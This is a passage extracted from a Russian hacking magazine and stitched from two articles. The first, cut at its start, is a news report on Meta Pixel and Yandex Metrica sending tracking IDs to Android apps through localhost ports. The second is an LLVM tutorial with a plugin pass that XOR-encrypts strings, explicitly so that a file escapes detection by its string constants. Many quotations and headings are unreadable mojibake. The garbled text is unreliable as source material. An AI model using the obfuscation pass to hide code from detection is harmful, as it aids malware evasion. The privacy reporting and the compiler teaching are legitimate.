и «Яндекс Мет рика» без труда могут отправлять веб-запросы с идентифика -
торами для веб-тре кинга на локаль ные порты, которые постоянно отслежива -
ются приложениями Facebook, Instagram и «Яндекса». В итоге эти приложе ния
могут свя зывать веб-айдентити с реаль ными пользователь скими данными,
даже если ты сидишь в при ватном режиме.




                   В Google Play сейчас ужесточили правила для заг -
                      ружа емых в магазин при ложений — как раз чтобы
                      пресекать такое.


Meta Pixel и «Яндекс Метрика» — это ана литические скрипты, созданные, что -
бы помочь рекламода телям. Meta Pixel установлен примерно на шести мил -
лионах сайтов, а «Яндекс Метрика» — на трех миллионах ресурсов.
   Meta и «Яндекс» умуд рились обой ти огра ничения, используя базовую воз -
можность современных мобиль ных браузе ров — общение с нативными при -
ложе ниями.  Эта  штука  позволяет  браузерам  отправлять  веб-зап росы
на локаль ные порты Android, чтобы, например, соз давать соединения через
протокол RTC, шейрить фай лы и отлаживать при ложе ния.





Вот концепту аль ная схе ма, где видно, как веб-трекеры, работающие в бра -
узе ре,  обменива ются  идентифика торами  с  нативными  приложениями
Facebook, Instagram и «Яндекс» для Android.
   Хотя тех нические детали различаются, Meta Pixel и «Яндекс Метрика»
занима ются своеобразным зло употреблением протоколом, что бы получить
дос туп к локальным портам на IP 127.0.0.1, который предоставляет Android.
Бра узеры спо кой но обращаются к этим портам без каких-либо уведомлений
для пользовате ля. Приложения Meta и «Яндекса» тихо слушают эти порты,
в реальном времени сни мают идентификаторы и связыва ют их с пользовате -
лем, который залогинен в при ложении.
  Пред ста витель Google заявил, что такое поведение нарушает условия
исполь зования платформы Play и ожи дания поль зователей Android в пла не
конфиденциаль ности.


      Ïðîãðàììèñ òû,  êîòîðûõ  óïîìÿíó ëè  â  ýòîì  äîê ëàäå,  óìóäðèëèñü
      èñïîëüçîâàòü  âîç ìîæíîñ òè áðà óçå ðîâ  íà  iOS è  Android  òàê,  ÷òî«
      ýòî ïðîñ òî â êîð íå ïðîòèâîðå÷èò íàøèì ïðèíöèïàì áåçîïàñ íîñòè
      è êîíôèäåíöèàëüíîñ òè, — çàÿâèë ïðåä ñòà âèòåëü, èìåÿ â âèäó òåõ, êòî
      ïèøåò JavaScript äëÿ Meta Pixel è «ßíäåêñ Ìåòðèêè». — Ìû óæå âíåñ ëè
      èçìå íåíèÿ, ÷òîáû ïðå äîòâðà òèòü ïîäîáíûå ìàíåâ ðû. Òàê æå ìû çàïóñ -
      òèëè ñâîå ðàñ ñëå äîâà íèå è íàï ðÿìóþ îáùà åìñÿ ñ ïðè÷àñ òíû ìè ñòî -
      ðîíà ìè.                »
Предста витель Meta не стал отвечать на вопросы, но прис лал такое заяв -



    Ìû âåäåì ïåðåãîâîðû ñ Google, ÷òîáû óëà äèòü íåäîïîíèìà íèå îòíî -
      ñèòåëüíî ïðèìåíå íèÿ èõ ïðà âèë. Êîãäà ìû ïîíÿëè, ÷òî âîç íèêëè âîï -ление:«
      ðîñû, ðåøèëè ïðèîñòà íîâèòü èñïîëüçîâàíèå ýòîé âîç ìîæíîñ òè, ïîêà
      âìåñ òå ñ Google íå ðàç áåðåì ñÿ â ñèòó àöèè.                »
В письме представитель «Яндекса» сообщил, что в компании прекращают эту
практику и уже работа ют с Google:

      «ßíäåêñ» ñòðîãî ñîáëþäà åò ñòàíäàðòû çàùèòû äàííûõ è íå äåàíî -
     íèìèçèðó åò ïîëüçîâàòåëüñêóþ èíôîðìà öèþ, — îòìå ÷àåòñÿ â çàÿâ -«
      ëåíèè. —  Ýòà ôóíêöèÿ  íå  ñîáèðà åò  íèêàêîé  êîíôèäåíöèàëüíîé
     èíôîðìà öèè è ïðåäíàçíà ÷åíà èñêëþ ÷èòåëüíî äëÿ òîãî, ÷òîáû óëó÷ -
      øèòü ïåð ñîíàëèçàöèþ â íàøèõ ïðèëîæå íèÿõ.                »
ÊÀÊ ÂÛ×ÈÑËßÞÒ ÏÎËÜÇÎÂÀÒÅËÅÉ ANDROID

Facebook
Разработчики Meta Pixel хитро обходили протоколы, чтобы внед рить скры тую
прослушку, при чем начали они этим заниматься в сен тябре прошлого года.
Сначала они зас тавляли при ложения отсылать HTTP-зап росы на порт 12387.
Но уже через месяц Meta Pixel прекратил отправку этих данных, хотя приложе -
ния Facebook и Instagram не переставали мониторить этот порт.
  В ноябре 2024 года Meta Pixel перешел на новенький метод — с исполь -
зовани ем  WebSocket,  протокола  для  двусторон него обмена  данными,
который работал на порте 12387.
  В том же месяце в Meta Pixel внед рили новую фишку — использование
WebRTC . Это пиринговый протокол, который обычно применя ют для звон ков
через бра узер.
   Тут дело в магии, называемой SDP munging : JavaScript позволяет менять
данные SDP (Session Description Protocol) перед их отправкой. SDP munging
в исполнении Meta Pixel подмешивает содержимое куки _fbp в поля, которые
обычно хра нят информа цию о соединении.
  В итоге браузер отправляет эти данные в STUN-запросе на локальный хост
Android, где приложение Facebook или Instagram спокойно считывает их и свя -
зыва ет с юзером.
  В мае в бета-версии Chrome появилась защита, блокирующая этот тип
модифи кации SDP. Однако всего через нес колько дней раз работ чики Meta
Pixel обошли эту защиту, добавив новый метод, который заменял зап росы
STUN запросами TURN.





Исследова тели досконально показали, как устро ена кука _fbp , которую сайт
отправляет в нативное приложение. Оттуда информация уже идет на сер вер
Meta.
 1. Поль зователь запускает нативное приложение Facebook или Instagram,
   которое затем отправляет ся в фоновый режим и создает фоновую службу
   для прос лушивания входящего трафика на порте TCP (12387 или 12388)
   и на UDP (первый свободный в диапазоне 12580–12585). Для этого юзер
   должен быть залогинен в при ложении.
 2. Далее юзер открывает бра узер и заходит на сайт с интегрированным Meta
    Pixel. На некоторых сайтах перед заг рузкой Meta Pixel тре бует ся согласие
   поль зователя. Но, по нашим данным из 100 тысяч страниц, лишь мень -
  шинс тво сай тов делает это, в то вре мя как более 75% затронутых ресур -
   сов не требуют согласия.
 3. Загружа ется скрипт Meta Pixel, который отправ ляет куку _fbp в нативное
   при ложение Instagram или Facebook через WebRTC (STUN) SDP munging.
   Этот же скрипт шлет значение _fbp на https://www.facebook.com/tr
   вместе с URL страницы  ( dl ), метаданными сай та и браузера, а также
   типом события ( ev ), например «Просмотр страницы», «Добав ление в кор -
   зину», «Пожертво вание» или «Покупка».
 4. При ложения Facebook или Instagram получают куку _fbp от скриптов Meta,
   запущенных в браузе ре, и переда ют данные на эндпоинт GraphQL
    ( https://graph[.]facebook[.]com/graphql ) вместе с другими пос -
   тоянными иден тифика торами  пользователя,  связывая  твой fbp  ID
   (веб-посещение) с твоей учетной записью Facebook или Instagram.





  Под робный процесс передачи куки _fbp из браузеров на Android в при -
  ложения Facebook и Instagram через Meta Pixel


«ßíäåêñ»
Извес тно, что «Яндекс Метрика» начала связывать посещен ные сай ты в бра -
узе рах Android с иден тификатора ми приложе ний в мае 2017 года, ког да тре -
кер стал отправлять HTTP-зап росы на локальные пор ты 29009 и 30102.
В мае 2018 года «Яндекс Мет рика» начала слать дан ные через HTTPS на пор -
ты 29010 и 30103.





             Шейринг идентифика торов «Яндекса»





                             Тай млайн

Некоторые бра узеры для Android начали блокировать особо наглые скрипты
в тре керах. Возьмем DuckDuckGo: он и раньше отсе ивал домены и IP, свя зан -
ные с этими трекерами, чтобы бра узер ничего не сли вал компании Meta. Точ -
но так же он рубит на корню и боль шую часть обращений к доменам, свя зан -
ным  с  «Яндекс Метрикой». После  того  как  иссле дователи сообщили
DuckDuckGo о неполном черном спис ке, раз работчики быстро добавили
недос тающие адре са.
  Бра узер Brave, кстати, тоже умеет блокировать передачу идентифика -
торов бла годаря сво им длин нющим блек-листам и защите от зап росов
на localhost без явного согласия поль зователя. А вот Vivaldi, другой браузер
на базе Chromium, при стандартных нас трой ках приватности отправляет
иден тифика торы на локаль ные порты Android. Исследователи говорят, что,
если вклю чить блокировку трекеров, это решает проблему утечки истории
просмотров.





          Нас тройки блокиров ки трекинга в Vivaldi для Android


ÊÀÊ ÁÎÐÎÒÜÑß

Лекарства, которые прописали себе DuckDuckGo, Brave, Vivaldi и Chrome,
пока что действу ют как надо, но иссле дователи пре дуп реждают, что в любой
момент это может перес тать работать.


     Ïîïûòêè ñîç äàòü ÷åð íûå ñïèñ êè äëÿ áðà óçå ðîâ çàêîí÷àòñÿ áåñ êîíå÷ -
      íîé ãîíêîé âîîðó æåíèé, è ýòî âñå ãî ëèøü ÷àñ òè÷íîå ðåøåíèå, —«
      ãîâîðèò Âàëëèíà-Ðîä ðèãåñ î òåêóùèõ ìåòîäàõ áîðüáû. — Ñîç äàâàòü
      ýôôåêòèâ íûå ñïèñ êè áëîêèðîâîê — çàäà÷à íåï ðîñòàÿ, âåäü ðàç ðàáîò -
      ÷èêàì áðà óçå ðîâ ïðèäåòñÿ ïîñ òîÿííî ìîíèòîðèòü, êàê èñïîëüçóþòñÿ
      ýòè âîç ìîæíîñ òè, ÷òîáû âûÿâ ëÿòü äðó ãèå õîñ òû, êîòîðûå ìîãóò çëî -
      óïîòðåáëÿòü êàíàëà ìè localhost, è îáíîâëÿòü ñâîè ñïèñ êè.                »
Он продолжает:


     Ìîæåò, òàêîé ïîä õîä è ñðà áîòà åò, êîãäà òåáå èçâåñ òíû íóæíûå õîñ -
      òíåéìû, íî ýòî íå ëó÷ øèé ñïîñîá ðåøåíèÿ ïðîáëåìû. Òðå êåðû ìîãóò«
      íàéòè îáõîäíîé ïóòü (íàï ðèìåð, èñïîëüçîâàòü âðå ìåííûå õîñ òíåéìû).
     Äîëãîñðî÷ íîå ðåøåíèå äîëæíî âêëþ ÷àòü â ñåáÿ ðàç ðàáîòêó è âíåä -
      ðåíèå ìåõàíèç ìîâ êîíôèäåíöèàëüíîñ òè è áåçîïàñ íîñòè äëÿ êàíàëîâ
        localhost: ÷òîáû ïîëüçîâàòå ëè ìîãëè óçíà âàòü î òîì, ÷òî ïðîèñõîäèò
      òàêîå âçà èìîäåéñòâèå, è ïðè íåîáõîäèìîñ òè îãðà íè÷èâàòü åãî (íàï -
      ðèìåð, ÷åðåç ðàç ðåøåíèÿ).                »
Chrome и большинство других бра узеров на базе Chromium выполняли
JavaScript так, как задума ли в Meta и «Яндексе». Firefox тоже прошел этот тест,
но по непонят ным причинам бра узер не смог успешно выпол нить SDP
munging, используемый в пос ледних вер сиях кода.
  В ран ней май ской бета-версии Chrome заблокировал STUN-вариант SDP
munging, а продак шен-версия, выпущенная две недели назад , начала бло -
кировать как STUN-, так и TURN-вари анты.
  Ско рее все го, дру гие бра узеры на базе Chromium внед рят это в ближай -
шие недели. Пред ста витель Mozilla заявил, что в организации придают боль -
шое зна чение конфиденциальности поль зовате лей и серьезно отнесутся
к этому отчету.


    Ìû àêòèâíî ðàñ ñëå äóåì îïèñàííîå ïîâåäå íèå è ïûòà åìñÿ âûÿñ íèòü
      âñå åãî òåõíè÷åñ êèå íþàíñû è ïîñ ëåäñ òâèÿ, — ñîîáùèëè â Mozilla. —«
     Íà îñíîâàíèè  òîãî, ÷òî ìû óæå âèäåëè, ñ÷èòàåì ýòî ñåðüåçíûì
      íàðóøå íèåì  íàøèõ  àíòèòðå êèíãîâûõ  ïîëèòèê  è  èùåì  ñïîñîáû
      çàùèòèòüñÿ îò íîâûõ òðå êèíãîâûõ õèòðîñòåé.                »
Исследова тели предуп реждают, что нынешние фиксы настолько завязаны
на кон крет ный код тре керов Meta и «Яндекса», что обойти их можно простым
обновлением.


     Îíè ïîíèìà þò, ÷òî åñëè êòî-òî äðó ãîé çàéäåò è ïîï ðîáó åò äðó ãîé
       ïîðò, òî âïîëíå ìîæåò îáîéòè ýòó çàùèòó, — ãîâîðèò Ãþíåø Àêàð, òîò«
     ñàìûé èññëå äîâà òåëü, êîòîðûé âïåð âûå íàòêíóëñÿ íà ýòó óÿç âèìîñòü,
      èìåÿ â âèäó ðàç ðàáîò÷èêîâ Chrome èç Google. — Íî íàñ êîëüêî ìû
      ïîíèìà åì, îíè õîòÿò ïîñ ëàòü ÷åòêèé ñèãíàë: òàê èçäå âàòüñÿ íàä ñèñ -
      òåìîé âñå æå íå ïðîêàòèò.                »
Исследова тель Валлина-Род ригес счи тает, что самый надежный способ пре -
дот вратить злоупот ребления — это что бы Android полностью пересмотрел,
как он обра баты вает дос туп к локальным портам.

     Îñ íîâíàÿ ïðîáëåìà â òîì, ÷òî äîñ òóï ê ñîêåòàì ëîêàëüíîãî õîñ òà
      íà Android âîîáùå íå êîíòðîëèðó åòñÿ, — îáúÿñíÿåò îí. — Ïîëüçîâàòå -«
      ëè íå ìîãóò ïðå äîòâðà òèòü òàêîãî ðîäà ñâÿçü íà ñâîèõ óñòðîéñòâàõ.
      Èç-çà äèíàìè÷åñ êîé ïðèðîäû JavaScript è ñëîæíîñòè â îáíîâëå íèè
      áëîê-ëèñ òîâ åäèíñ òâåííûé âåð íûé ñïîñîá ïîñ òîÿííî áëîêèðîâàòü
      òàêèå øòó êè — ýòî îãðà íè÷èòü ïîäîáíûé äîñ òóï íà óðîâ íå ìîáèëüíîé
      ïëàòôîðìû è áðà óçå ðà, âíåä ðÿÿ áîëåå ñòðîãèå ïîëèòèêè, ÷òîáû îãðà -
      íè÷èòü êèáåð çëîóïîòðåáëå íèÿ.                »
ÄÀÍÎ ËÈ ÑÎÃËÀÑÈÅ?

Нет никаких приз наков того, что Meta или «Яндекс» сооб щили сайтам с тре -
керами или пользовате лям, которые на них заходят, об отсле живании.
На форумах разработчиков видно, что многие вла дель цы сайтов, исполь -
зующие Meta Pixel, были в шоке, когда обнаружи ли, что скрипты обращаются
к локаль ным портам.
  «С 5 сентября наш внутренний тре кер оши бок JS начал отме чать неудач -
ные зап росы fetch к localhost:12387, — написал один из раз работчиков. —
С нашей стороны никаких изменений не было, а пиксель тре кин га Facebook,
которым мы поль зуемся, грузится через Google Tag Manager».
   «А можно как-то это отключить?» — спросил еще один разработчик, стол -
кнувшись с загадочным дос тупом к локальному пор ту.
  Не совсем ясно, нарушает ли отслеживание переходов из браузе ра
в нативные приложения законы о приват ности в разных странах. Но Meta
и про чие компании, использующие ее Meta  Pixel, уже не раз попадали
под раз дачу в суде. Вспомни хотя бы эти слу чаи:
 • Facebook users sue Meta for bypassing beefy Apple security to spy on millions
 • Major tax-ling websites secretly share income data with Meta
 • Tax preparers that shared private data with Meta, Google could be ned billions
 • AMC to pay $8M for allegedly violating 1988 law with use of Meta Pixel

Во всех этих делах утвер жда ется, что сбор данных нарушает правила кон -
фиденциаль ности. Более того, в исследова нии 2023 года (когда Meta Pixel
еще назывался Facebook Pixel) выяснилось, что он трекает действия поль -
зовате лей на сайтах в пугающих под робнос тях, особенно на тех, которые
попада ют под понятие «чувс твительных» сог ласно GDPR.


ÂÛÂÎÄ

По ка что в Google не сооб щают о пла нах изменить способ обработки локаль -
ного доступа к пор там в Android. Если хочешь мак сималь но защитить ся
от слежки через Meta Pixel и «Яндекс Метрику», самый надежный способ —
не ставить при ложения Meta и «Яндекса» на свои устройства с Android.
КОДИНГ





Прочитав   эту   статью,   ты   узна ешь,
как работает обфусцирующий компилятор,
углу бишь ся в архитек туру LLVM и сможешь
писать собс твенные проходы для обфуска -
ции кода. Мы сделаем обфускатор строчек,          mr.grogrig@gmail.commr.grogrig
соберем LLVM из исходников и узнаем,
как интегрировать  obfuscator-llvm в сов -
ременный  Visual  Studio,  чтобы собирать
твой код с обфускацией.


×ÒÎ ÇÀ ÇÂÅÐÜ LLVM

Про ект LLVM стартовал в 2000 году и получил рас пространение в начале
десятых. Изначальная расшифров ка — low level virtual machine, хотя сейчас
она не отражает суть проекта. LLVM — фрей мворк с открытым исходным
кодом для соз дания компилято ров. На базе LLVM мож но соб рать ком пилятор
для собс твен ного языка прог раммирования. Или «улучшить» существующий,
чем мы сегодня и зай мемся.
  Архитектурно LLVM разделен на  три  части: фрон тенд, оптимизация
и бэкенд. Фрон тенд пре обра зует исходный код в промежу точное представ -
ление (intermediate representation) — уни вер саль ный промежуточный код,
который исполь зует ся на сле дующих эта пах для оптимизации кода и сбор ки
фай ла. Опти миза ция  уда ляет неисполь зуемый  код, сворачивает ариф -
метичес кие вычисления в готовые констан ты и заменя ет неэффективные
конс трукции более быстры ми. Бэкенд превращает IR в машин ный код.
   Ес ли ты соз даешь новый язык, дос таточ но написать фронтенд, генери -
рующий IR, а осталь ную работу LLVM возьмет на себя. Точно так же можно
работать с кодом (изна чально написанным на любом поддерживаемом язы -
ке) на уров не  IR, меняя его под свои нужды на этапе оптимизации.
Или написать свой бэкенд, чтобы собирать старый код под неиз вес тную про -
цес сорную архи тектуру.
  Необя зательно писать фронтенд с нуля. Дос таточ но модифицировать
исходный код LLVM. Оптимиза ция — более гибкий инс трумент, она под -
держи вает заг ружа емые пла гины, добав ляющие ïðî õîäû — специальные
функции, обрабатывающие IR на уровне модуля, фун кции, цикла или базового
блока. Для обфуска ции кода мы будем использовать именно их.


ÑÁÎÐÊÀ LLVM ÏÎÄ WINDOWS

Для начала уста новим CMake и поместим утилиту ninja.exe в C:\Program
Files\CMake\bin, тем самым сделав ее видимой для CMake при сбор ке.



  mkdir C:\LLVM && cd C:\LLVM


  "C:\Program Files\Microsoft Visual
  Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"


  git clone https://github.com/llvm/llvm-project.git
  cd llvm-project
  mkdir build && cd build


  cmake -G "Ninja" ^
   -DLLVM_ENABLE_PROJECTS="clang" ^
   -DLLVM_ENABLE_ASSERTIONS=ON ^
   -DCMAKE_BUILD_TYPE=Release ^
   -DLLVM_BUILD_LLVM_DYLIB=ON ^
   -DLLVM_ENABLE_RTTI=ON ^
   -DCMAKE_INSTALL_PREFIX=C:/llvm/custom ^
   ../llvm


  ninja
  ninja install


Создаем пап ку в корне дис ка и запускаем vcvars64.bat. Он установит необ -
ходимые для сбор ки переменные окружения, такие как путь до компилятора
и под клю чаемых фай лов MSVC. Далее клониру ем исходный код LLVM и запус -
каем сборку. Ждем около часа окончания сборки и получаем новые файлы
в C:\LLVM\custom. Среди них утилиты, компиляторы и подключаемые фай лы
.lib. Они при годят ся при создании собс твенных проходов для оптимизации.


Ñáîðêà ïðîõîäîâ
Создаем проект в Visual Studio и меняем его настройки:


Configuration Type = Dynamic Library (.dll)
Additional Include Directories = C:\LLVM\include
Additional Library Directories = C:\LLVM\lib
C++ Langauge Standart = ISO C++17 Standard (/std:c++17)
Code Generation → RuntimeLibrary = /MT

Также добав ляем список .lib в Additional Dependencies:


LLVMCore.lib
LLVMSupport.lib
LLVMBitReader.lib
LLVMIRReader.lib
LLVMAnalysis.lib
LLVMPasses.lib
LLVMFrontendOpenMP.lib
LLVMTargetParser.lib
LLVMRemarks.lib
LLVMProfileData.lib
LLVMBinaryFormat.lib
LLVMDemangle.lib
LLVMBitstreamReader.lib

Та ким образом собира ются все наши проходы.


ÏÐÎÕÎÄ ÄËß ÀÍÀËÈÇÀ ÏÎÊÐÛÒÈß

Создадим прос той пла гин для оптимизатора. Первое, что приходит на ум, —
добавить логирование на вход каждой фун кции. AFL использует похожий под -
ход для определения покрытия — он добав ляет свой код в иссле дуемые
исходни ки, чтобы отслеживать поток управления.


#pragma warning(disable : 4146)
#pragma comment(linker, "/export:llvmGetPassPluginInfo")
#define _CRT_SECURE_NO_WARNINGS


#include "llvm/Passes/PassBuilder.h"
#include "llvm/Passes/PassPlugin.h"
#include "llvm/IR/PassManager.h"
#include "llvm/Pass.h"
#include "llvm/IR/Function.h"
#include "llvm/IR/Module.h"
#include "llvm/IR/IRBuilder.h"
#include "llvm/IR/Type.h"
#include "llvm/IR/Instructions.h"
#include "llvm/IR/Constants.h"
#include "llvm/IR/DerivedTypes.h"
#include "llvm/Support/raw_ostream.h"


using namespace llvm;


struct DebugTracePass : PassInfoMixin<DebugTracePass> {
  PreservedAnalyses run(Module& M, ModuleAnalysisManager&) {
    LLVMContext& Ctx = M.getContext();


    // Получаем i8* тип (char*)
    Type* i8Ty = Type::getInt8Ty(Ctx);
    PointerType* i8PtrTy = PointerType::get(i8Ty, 0);


    // Тип функции: void OutputDebugStringA(char*)
    FunctionType* debugFnTy = FunctionType::get(Type::getVoidTy(Ctx),
{ i8PtrTy }, false);
    FunctionCallee debugFn = M.getOrInsertFunction(
"OutputDebugStringA", debugFnTy);


    for (Function& F : M) {
      // Пропуск, если это объявление функции
      if (F.isDeclaration()) continue;


      // Строим IR перед первой инструкцией
      Instruction* insertPt = &*F.getEntryBlock().getFirstInsertionPt
();
      IRBuilder<> builder(insertPt);


      // Формируем строку
      std::string msg = "Enter: " + F.getName().str();
      Value* msgStr = builder.CreateGlobalString(msg);


      // Вставляем вызов OutputDebugStringA
      builder.CreateCall(debugFn, msgStr);
    }


    return PreservedAnalyses::none();
  }
};


extern "C"
llvm::PassPluginLibraryInfo llvmGetPassPluginInfo() {
  return {
    LLVM_PLUGIN_API_VERSION, // Версия API плагинов
    "InjectFunctionCallPass", // Название плагина
    "v0.1", // Версия
    [](llvm::PassBuilder& PB) {


      PB.registerPipelineParsingCallback(
        [](llvm::StringRef Name,
           llvm::ModulePassManager& MPM,
           llvm::ArrayRef<llvm::PassBuilder::PipelineElement>) {


          if (Name == "debug-trace") {
            MPM.addPass(DebugTracePass());
            return true;
          }


          return false;
        });


    } };
}

Здесь я сна чала отключаю раздра жающее предуп реждение о невер ной
типиза ции  внут ри  кода  LLVM.  Затем  прошу  экспортировать  функцию
llvmGetPassPluginInfo . Она должна быть в экспор те плагина, чтобы сооб -
щить при загрузке его название и добавить новый проход debug-trace в спи -
сок дос тупных проходов. Проход рас полагается  в методе run  клас са
DebugTracePass .
   Внут ри прохода получаю ссылку на функцию OutputDebugStringA , пред -
варительно указав ее прототип. Далее перебираю внутри модуля все фун -
кции, у которых есть тело, а не толь ко опре деление. Вызов getEntryBlock
отдает первый базовый блок в теле функции, а getFirstInsertionPt воз -
вра щает итератор. Преобра зуем его в ссылку на первую инструк цию. Теперь
соз даю объект IRBuilder, который будет генери ровать инс трук ции в задан -
ной точке, то есть перед пер вой инс трукцией. Формирую глобальную строку
с именем функции, которая будет располагаться в секции данных. И создаю
вызов функции OutputDebugStringA с аргу ментом в виде только что опре -
деленной строки. В конце PreservedAnalyses явно сообщает LLVM, что код
модуля изменился и ста рый ана лиз модуля неактуален.


ÇÀÏÓÑÊ ÏÐÎÕÎÄÀ

Создадим для теста самый прос той исходник:


#include <Windows.h>


int main()
{
    return 0;
}

И соберем из него промежу точный код:



  clang.exe -S -emit-llvm test.cpp -o test.ll


Нас тало вре мя при менить новый проход:



  opt.exe -load-pass-plugin llvm_pass.dll -passes=debug-trace -S test.ll -
  o output.ll


Посмотрим на созданный после прохода промежуточный код:


@0 = private unnamed_addr constant [12 x i8] c"Enter: main\00",
align 1


; Function Attrs: mustprogress noinline norecurse nounwind optnone
uwtable
define dso_local noundef i32 @main() #0 {
entry:
  call void @OutputDebugStringA(ptr @0)
  %retval = alloca i32, align 4
  store i32 0, ptr %retval, align 4
  ret i32 0
}


declare void @OutputDebugStringA(ptr)

Как   и  ожи далось,   в   начале   функции   main   появился   вызов
OutputDebugStringA . Попробу ем соб рать IR в исполня емый файл.



  clang.exe output.ll -o output.exe


Запус каю полученный EXE и в DbgView вижу стро ку [8092] Enter: main .


ÏÐÎÕÎÄ ÄËß ÑÊÐÛÒÈß ÑÒÐÎÊ

Рассмот рим пример поинтерес нее. Допус тим, мы хотим избежать детек -
тирования нашего файла по строковым констан там. Для этого следует
зашифровать все строчки на эта пе компиляции и расшифровывать их
в локальный буфер в момент использования. Для шифрования подойдет
любой симметричный алгоритм, но для прос тоты используем обычный XOR
с константой.


class EncryptStringsPass : public PassInfoMixin<EncryptStringsPass> {
  LLVMContext* Ctx;
  Type* i8Ty;
  PointerType* i8PtrTy;
  Type* i32Ty;
  FunctionCallee DecryptFunc;


  std::string encryptString(const std::string& Original) {
    std::string Encrypted = Original;
    for (char& c : Encrypted) c ^= 0xAA;
    return Encrypted;
  }


  void createDecryptionBuffer(IRBuilder<>& B, Value* TargetPtr,
unsigned Len, Value*& OutBufPtr) {
    auto* Buf = B.CreateAlloca(ArrayType::get(i8Ty, Len + 1));
    auto* BufCast = B.CreatePointerCast(Buf, i8PtrTy);
    auto* PtrCast = B.CreatePointerCast(TargetPtr, i8PtrTy);
    B.CreateCall(DecryptFunc, { BufCast, PtrCast, B.getInt32(Len) });
    OutBufPtr = BufCast;
  }


  void handleConstantExprUser(ConstantExpr* CE, const std::string&
Original) {
    std::vector<User*> CEUsers(CE->users().begin(), CE->users().end
());
    for (User* Use : CEUsers) {
      if (auto* I = dyn_cast<Instruction>(Use)) {
        IRBuilder<> B(I);
        Value* BufPtr = nullptr;
        createDecryptionBuffer(B, CE, Original.size(), BufPtr);
        I->replaceUsesOfWith(CE, BufPtr);
      }
    }
  }


  void handleRegularUser(Value* Ptr, Instruction* InsertPt, const std
::string& Original) {
    IRBuilder<> B(InsertPt);
    Value* BufPtr = nullptr;
    createDecryptionBuffer(B, Ptr, Original.size(), BufPtr);


    Ptr->replaceUsesWithIf(BufPtr, [&](Use& U) {
      return dyn_cast<Instruction>(U.getUser()) == InsertPt;
      });
  }


public:
  PreservedAnalyses run(Module& M, ModuleAnalysisManager&) {
    Ctx = &M.getContext();
    i8Ty = Type::getInt8Ty(*Ctx);
    i8PtrTy = PointerType::get(i8Ty, 0);
    i32Ty = Type::getInt32Ty(*Ctx);


    DecryptFunc = M.getOrInsertFunction(
      "decryptStringInto",
      FunctionType::get(Type::getVoidTy(*Ctx), { i8PtrTy, i8PtrTy,
i32Ty }, false)
    );


    for (auto& GV : M.globals()) {
      if (!GV.hasInitializer() || !GV.isConstant()) continue;


      auto* CA = dyn_cast<ConstantDataArray>(GV.getInitializer());
      if (!CA || !CA->isString()) continue;


      std::string Original = CA->getAsString().str();
      std::string Encrypted = encryptString(Original);


      auto* ArrayTy = cast<ArrayType>(GV.getValueType());
      if (Encrypted.size() < ArrayTy->getNumElements())
        Encrypted.resize(ArrayTy->getNumElements(), '\0');


      std::vector<uint8_t> Bytes(Encrypted.begin(), Encrypted.end());
      GV.setInitializer(ConstantDataArray::get(*Ctx, Bytes));
      GV.setConstant(false);


      std::vector<User*> Users(GV.users().begin(), GV.users().end());
      for (User* U : Users) {
        if (auto* CE = dyn_cast<ConstantExpr>(U)) {
          if (CE->getOpcode() == Instruction::GetElementPtr) {
            handleConstantExprUser(CE, Original);
          }
          continue;
        }


        Instruction* InsertPt = nullptr;
        Value* Ptr = nullptr;


        if (auto* GEP = dyn_cast<GetElementPtrInst>(U)) {
          Ptr = GEP;
          if (!GEP->user_empty())
            InsertPt = dyn_cast<Instruction>(*GEP->user_begin());
        }
        else if (auto* I = dyn_cast<Instruction>(U)) {
          Ptr = &GV;
          InsertPt = I;
        }


        if (Ptr && InsertPt)
          handleRegularUser(Ptr, InsertPt, Original);
      }
    }


    return PreservedAnalyses::none();
  }
};




                                     Продолжение статьи →
КОДИНГ                         НАЧАЛО СТАТЬИ



                 ОБФУСЦИРУЕМ КОД
                  ПРИ ПОМОЩИ LLVM




Рассмот рим метод run. Код переби рает все глобальные переменные, отбра -
сывая те, у которых нет зна чения, и те, что не являются кон стантой. Если кон -
станта — это строка, получа ем ее значение и шифруем. Далее подменяем
ори гинальную строку шифрованными байтами. Затем копируем список поль -
зовате лей этой кон станты в массив Users . Про ходим по списку и вызываем
обра бот чики для раз ных типов «поль зователей». В обоих случаях вставляем
перед инс трукцией локальный буфер и вызов процедуры расшифровки.
Наконец, заменя ем ссылку на исходную строку ссылкой на созданный нами
буфер.


#include <windows.h>
#include <stdint.h>
#include <stdlib.h>


extern "C" void decryptStringInto(char* out, const char* enc, int len
) {
  char key = 0xAA;
  for (int i = 0; i < len; ++i) {
    out[i] = enc[i] ^ key;
  }
  out[len] = '\0';
}


int main()
{
  DWORD written;
  const char* message = "Xakep.ru\n";
  WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), message, (DWORD)
lstrlenA(message), &written, NULL);
  return 0;
}

Я взял простой тестовый код, выводящий строчку в кон соль. Проще всего
помес тить вызыва емую обфуска тором decryptStringInto в оригинальный
код.


clang.exe -S -emit-llvm test_str.cpp -o test_str.ll
opt.exe -load-pass-plugin llvm_pass.dll -passes=encrypt-strings -S
test_str.ll -o output.ll
clang.exe output.ll -o output.exe

Со берем исходник и пос мотрим после декомпиляции, что внутри:


int __fastcall main(int argc, const char **argv, const char **envp)
{
  HANDLE StdHandle;
  LPCSTR lpBuffer;
  int nNumberOfCharsToWrite;
  CHAR v7[9];
  LPCSTR lpString;
  DWORD NumberOfCharsWritten[2];


  NumberOfCharsWritten[1] = 0;
  sub_140001000(v7, &unk_14001A000, 8);
  lpString = v7;
  nNumberOfCharsToWrite = lstrlenA(v7);
  lpBuffer = lpString;
  StdHandle = GetStdHandle(0xFFFFFFF5);
  WriteConsoleA(StdHandle, lpBuffer, nNumberOfCharsToWrite,
NumberOfCharsWritten, 0);
  return 0;
}

Запус тив файл в консоли, убеждаем ся, что все работает: строка выводится
без обфуска ции, хотя и не сохраняется в откры том виде.


OLLVM-16

Вре мя поговорить о серьезных обфуска торах. Про ект obfuscator-llvm (или,
как его сокращенно называют, OLLVM) появился в 2010 году как университет -
ский проект по защите кода. Фактически это форк LLVM, встраивающий про -
ходы обфускации в сам компилятор. Он работает с промежу точным кодом,
так что теоре тичес ки может работать с любыми поддерживаемы ми LLVM
выходными языком и архитектурой. Последняя версия обфуска тора вышла
для LLVM-4 (актуальная версия — LLVM-20). Но к счастью, есть современ ный
порт OLLVM-16 , с ним мы и будем работать.


Ñáîðêà
Для начала установим в Visual Studio 2022 пару пакетов для работы с LLVM:


Compilers, build tools, and runtimes
☑ C++ Clang Compiler for Windows (19.1.5)
☑ MSBuild support for LLVM (clang-cl) toolset

Теперь можно начинать сбор ку.


